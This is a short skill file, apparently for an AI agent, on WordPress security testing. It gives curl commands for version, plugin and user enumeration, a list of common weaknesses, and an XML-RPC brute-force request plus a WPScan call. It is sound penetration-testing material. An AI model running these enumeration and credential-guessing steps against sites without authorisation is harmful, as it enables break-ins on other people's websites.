---
name: noir-tech-wordpress
description: "WordPress security testing. Use when target uses WordPress CMS. Trigger keywords: wordpress, wp, woocommerce, wp-admin, wp-config."
---

# WordPress Security Testing

## Enumeration
```bash
# Version detection
curl -s "https://target.com/readme.html"
curl -s "https://target.com/feed" | grep generator

# Plugins
curl -s "https://target.com/wp-content/plugins/"
curl -s "https://target.com/wp-content/plugins/akismet/readme.txt"

# Users
curl -s "https://target.com/wp-json/wp/v2/users"
```

## Common Vulnerabilities
- Outdated core/plugins/themes
- Weak admin credentials
- XML-RPC abuse (DDoS, auth bypass)
- File upload in plugins
- SQL injection via plugins

## Exploitation
```bash
# XML-RPC brute force
curl -s -X POST "https://target.com/xmlrpc.php" \
  -d '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>password</value></param></params></methodCall>'

# WPScan
wpscan --url https://target.com --api-token API_KEY
```

## Output
WordPress version, plugin list, user enumeration, vulnerabilities.
